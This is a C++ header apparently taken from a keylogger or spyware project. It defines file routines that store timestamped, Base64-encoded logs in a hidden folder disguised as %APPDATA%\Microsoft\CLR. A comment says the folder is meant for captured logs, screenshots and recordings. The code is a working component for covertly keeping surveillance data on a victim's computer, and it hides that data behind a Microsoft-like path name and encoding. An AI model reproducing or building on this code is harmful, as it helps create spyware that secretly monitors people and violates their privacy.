
/* All the functions that will be used for operations like
creating files, reading from them and finding path etc. */

#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>

#include "windows.h" //windows API
#include "Helper.h"
#include "Base64.h"

namespace IO
{
    /*This function is to retrieve our designated folder,
     where all the logs (screenshots, audio, video recordings not in this version) will be*/
     std::string GetOurPath (const bool append_seperator = false)
     //seperator checks if the backslash is needed at the end of our path
     {
         //C:\Users\Mert Tuncay\AppData\Roaming
         std::string appdata_dir(getenv("APPDATA"));//get environment
         std::string full = appdata_dir + "\\Microsoft\\CLR";
         return full + (append_seperator ? "\\" : "");
     }
     /*The windows API function creates a directory,and returns true on success,Otherwise, it may return error already exists.
    If the directory is already created,or if the path cannot be found, if the call was unsuccessful,so
    this is OK. Because that directory created some time ago or right now what is important is it does exists.
    So,It will exit after the function call.This function will not create subdirectories if they don't exists.
    */
     bool MkOneDR(std::string path)
     {
         return (bool)CreateDirectoryA(path.c_str(), NULL) ||
                GetLastError() == ERROR_ALREADY_EXISTS ; //either is created subdirectories or it already exist
     }
     //If the directory doesn't exist the above function will fail, so we need a backup function
     bool MkDir(std::string path)
     {
         for(char &c : path)
            if(c == '\\')
             {
                 c = '\0';
                 if(!MkOneDR(path)) return false;
                 c = '\\';
             }
            return true;
     }

     template <class T>
     std::string WriteLog(const T &t)
     {
         std::string path = GetOurPath(true);
         Helper::DateTime dt;
         std::string name = dt.GetDateTimeString("_") + ".log";
         //It attempts to open up the file and write into it, if there is problem it return an exception
         try
         {
             std::ofstream file(path + name);
             if(!file) return "";
             std::ostringstream s;
             s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl ;
             std::string data = Base64::EncryptB64(s.str());
             file << data;
             if(!file) return "";
             file.close();
             return name;
         }
         catch(...)
         {
             return "";
         }

     }





}



#endif // IO_H
